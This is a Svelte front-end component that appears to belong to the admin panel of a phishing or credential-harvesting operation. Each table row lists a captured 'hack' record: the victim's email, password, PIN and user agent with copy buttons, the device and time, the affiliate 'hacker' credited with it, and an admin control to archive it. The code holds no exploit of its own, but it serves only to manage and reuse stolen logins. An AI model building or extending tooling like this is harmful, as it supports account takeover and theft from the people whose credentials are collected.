<script>
  import { updateHack } from "$lib/actions";
  import {
    allHacksList,
    allUsersList,
    hacksList,
    user,
  } from "$lib/stores/user-store";

  // import { db } from "./firebase.js";
  import CopyButton from "./CopyButton.svelte";
  import DeviceIcon from "./DeviceIcon.svelte";
  import moment from "moment";
  export let hack;
  export let isShowHacker=false;

  async function archive() {
    console.log("archived successfully");
    $hacksList = $hacksList.filter((e) => e.id !== hack.id);
    $allHacksList = $allHacksList.filter((e) => e.id !== hack.id);
    await updateHack(hack.id, { archived: true });
    // db.collection("hacks").doc(hack.id).update({ archived: true });
  }

  function findHacker() {
    console.log('hack0',hack)
    console.log('hack0',hack)
    if (!hack.ref) return "***";
    let hacker = $allUsersList.find((u) => u.ref === hack.ref);
    console.log(hacker)
    return hacker.displayName;
  }
</script>

<tr>
  <td>
    <div style="padding: 2px 8px 2px 0px; max-width:fit-content">
      <div class="bordered oneline">
        <DeviceIcon device={hack.device} />

        <span class="time-text"
          >{moment(new Date(hack.timestamp)).calendar()}</span
        >
      </div>
    </div>
  </td>
  {#if isShowHacker}
    <td>
      <div class="onelineeven">
        <p class="mdc-typography--body2">
          {findHacker()}
        </p>
      </div>
    </td>
  {/if}
  <td>
    <div class="onelineeven">
      <p class="mdc-typography--body2">
        {hack.email}
      </p>
      <CopyButton name={hack.email} />
    </div>
  </td>
  <td>
    <div class="onelineeven">
      <p class="mdc-typography--body2">
        {hack.password}
      </p>
      <CopyButton name={hack.password} />
    </div>
  </td>
  <td>
    {#if hack.pin}
      <div class="onelineeven">
        <p class="mdc-typography--body2">
          {hack.pin}
        </p>
        <CopyButton name={hack.pin} />
      </div>
    {/if}
  </td>
  <td>
    {#if hack.userAgent}
      <div class="onelineeven">
        <p class="userAgentText">
          {hack.userAgent}
        </p>
        <CopyButton name={hack.userAgent} />
      </div>
    {/if}
  </td>
  {#if $user.isAdmin}
    <td>
      <div style="padding-left: 4px;">
        <button on:click={archive}>recycle</button>
      </div>
    </td>
  {/if}
</tr>

<style>
  .userAgentText {
    font-size: 10px;
    font-family: roboto, sans-serif;
    max-width: 300px;
    text-wrap: wrap;
  }
  .time-text {
    font-family: roboto;
    font-size: 10px;
  }
  td {
    padding-right: 12px;
  }
  .oneline {
    display: flex;
    justify-content: space-between;
    align-items: center;
    gap: 4px;
  }

  .onelineeven {
    display: flex;
    /* justify-content: space-around; */
    align-items: center;
  }
  .bordered {
    padding: 2px 4px;
    border: 1px solid gray;
    border-radius: 5px;
  }
</style>
